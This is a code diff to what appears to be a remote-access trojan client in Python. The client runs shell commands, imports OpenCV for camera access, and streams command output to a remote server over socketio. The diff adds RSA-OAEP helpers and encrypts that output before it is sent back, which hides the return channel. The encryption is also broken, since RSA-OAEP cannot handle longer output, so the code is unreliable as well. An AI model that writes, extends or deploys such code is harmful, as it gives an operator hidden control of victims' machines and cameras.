@@ -3,6 +3,7 @@ import threading
 import platform
 import socketio
 import getpass
+import json
 import sys
 import base64
 import ssl
@@ -17,6 +18,63 @@ import re
 import zlib
 import cv2  # Import OpenCV for camera access
 import signal
+from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import serialization
+
+def encrypt(public_key, plaintext):
+    """
+    Encrypt a message using the provided public key.
+    
+    Args:
+    public_key: The RSA public key used to encrypt the data.
+    plaintext: The string message to encrypt.
+    
+    Returns:
+    The encrypted message (ciphertext).
+    """
+    # Convert plaintext to bytes
+    plaintext_bytes = plaintext.encode('utf-8')
+    
+    # Encrypt the plaintext using the public key
+    ciphertext = public_key.encrypt(
+        plaintext_bytes,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    
+    return ciphertext
+
+
+def decrypt(private_key, ciphertext):
+    """
+    Decrypt a message using the provided private key.
+    
+    Args:
+    private_key: The RSA private key used to decrypt the data.
+    ciphertext: The encrypted message to decrypt.
+    
+    Returns:
+    The decrypted message (plaintext).
+    """
+    # Decrypt the ciphertext using the private key
+    plaintext_bytes = private_key.decrypt(
+        ciphertext,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    
+    # Convert the decrypted bytes to a string
+    return plaintext_bytes.decode('utf-8')
+
 
 # Platform check for GUI libraries
 if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
@@ -110,7 +168,7 @@ def run(data, public_key):
                         .decode(errors="ignore")
                     )
                     if output:
-                        sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
+                        sio.emit("result", encrypt(public_key, json.dumps({"key": self.key, "result": output, 'uid':self.uid})))
                         self.reset_inactivity_timer()  # Reset timer on output
                 except OSError:
                     break
@@ -118,7 +176,7 @@ def run(data, public_key):
         def read_output_windows(self):
             while self.process.isalive():
                 output = self.process.read()
-                sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
+                sio.emit("result", encrypt(public_key, json.dumps({"key": self.key, "result": output, 'uid':self.uid})))
                 self.reset_inactivity_timer()  # Reset timer on output
 
         def write_input(self, command):
